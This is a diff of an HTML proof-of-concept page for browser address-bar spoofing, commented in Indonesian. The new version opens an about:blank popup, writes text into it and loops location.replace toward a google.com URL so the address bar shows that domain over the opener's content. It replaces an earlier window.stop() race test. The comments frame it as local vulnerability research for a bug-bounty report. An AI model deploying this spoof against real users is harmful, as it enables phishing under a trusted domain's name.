@@ -1,55 +1,14 @@
-<!-- MEKANISME: window.stop() ditembakkan pada popup saat navigasi masih pending; navigasi batal sebelum commit dan opener menulis about:blank yang tersisa. -->
-<meta charset="utf-8">
-<title>4 - Hang via window.stop() (Knob A)</title>
-<style>
-body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
-code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
-.box{border:1px solid #ccc;border-left:5px solid #666;padding:2px 14px;margin:14px 0;background:#fafafa}
-.v{color:#a00}.s{color:#060}
-button{font:15px inherit;padding:10px 14px;margin:6px 8px 6px 0;cursor:pointer}
-#log{min-height:1.6em;font-weight:600}
-</style>
-
-<h2>4 &mdash; Hang via <code>window.stop()</code> pada momen pending (Knob A)</h2>
-
-<p>URL asli halaman ini: <code id="here"></code></p>
-
-<div class="box">
-<p><b>Mekanisme:</b> popup dibuka ke URL yang normalnya commit, lalu opener memanggil <code>w.stop()</code> setelah 40&nbsp;ms &mdash; sebelum commit. Navigasi dibatalkan, <code>about:blank</code> awal tetap milik opener, dan opener menulis isinya.</p>
-<p class="v"><b>VULNERABLE:</b> address bar popup menampilkan <code id="t1"></code> padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> begitu navigasi dibatalkan, address bar popup kembali ke <code>about:blank</code> &mdash; URL tanpa dokumen tidak diatribusikan ke isi jendela.</p>
-</div>
-
-<button id="run">Jalankan mekanisme (dengan stop())</button>
-<button id="ctrl">Lengan KONTROL (URL sama, TANPA stop())</button>
-
-<p id="log"></p>
-<p>Kedua tombol memakai URL yang sama persis; satu-satunya variabel adalah pemanggilan <code>stop()</code>.</p>
-
+<!-- 04 - popup about:blank + replace loop   [address-bar spoofing | macOS: Dia/Arc/Chrome/Safari macOS]
+     MEKANISME : about:blank hasil window.open TIDAK punya URL sendiri, jadi bilah tak punya kebenaran untuk kembali; location.replace tanpa delay (clamp ~4ms) menahan pending.
+     PREDIKAT  : bilah POPUP menulis https://www.google.com sementara isinya tulisan penyerang.
+     AMAN      : popup menampilkan about:blank atau origin pembuka.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>04 popup about:blank + replace loop</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var TARGET = 'https://example.com/';
-document.getElementById('here').textContent = location.href;
-document.getElementById('t1').textContent = TARGET;
-function log(m){ document.getElementById('log').textContent = m; }
-function paint(w, label){
-  try{
-    w.document.write('<meta charset="utf-8"><title>DEMO MARKER</title>'
-      + '<body style="font:16px/1.5 sans-serif;padding:24px">'
-      + '<div style="font-size:32px;font-weight:700">DEMO MARKER</div>'
-      + '<p>' + label + '</p>'
-      + '<p>Teks ini ditulis oleh opener, bukan oleh server mana pun.</p>'
-      + '<p>location.href dokumen ini: <b id="u">?</b></p>'
-      + '<p>Bandingkan dengan address bar jendela ini.</p>'
-      + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
-    w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup.');
-  }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
-}
-function go(useStop,label){
-  var w = window.open(TARGET,'_blank','width=780,height=460');
-  if(!w){ log('Popup diblokir - izinkan popup untuk situs ini lalu ulangi.'); return; }
-  setTimeout(function(){ if(useStop){ try{ w.stop(); }catch(e){} } paint(w,label); }, 40);
-}
-document.getElementById('run').onclick  = function(){ go(true ,'lengan UJI - stop() dipanggil saat pending'); };
-document.getElementById('ctrl').onclick = function(){ go(false,'lengan KONTROL - tanpa stop()'); };
+var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
+function go(){var w=window.open('','');setInterval(function(){w.location.replace(T);});w.document.write('<h3>BUKAN google.com - ditulis '+location.origin+'</h3>');}
 </script>
